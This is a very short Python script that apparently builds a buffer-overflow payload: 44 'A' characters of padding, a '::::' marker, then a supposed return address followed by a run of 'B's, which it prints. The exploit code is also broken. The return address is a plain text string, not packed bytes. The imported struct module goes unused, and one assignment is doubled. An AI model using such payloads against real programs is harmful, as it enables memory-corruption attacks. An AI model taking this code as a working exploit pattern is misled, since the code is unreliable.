import struct

padd= "A"*44
padd+="::::"
ret="0X860000 0x40000000 BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"
exp=""
exp=exp=padd+ret
print(exp)	
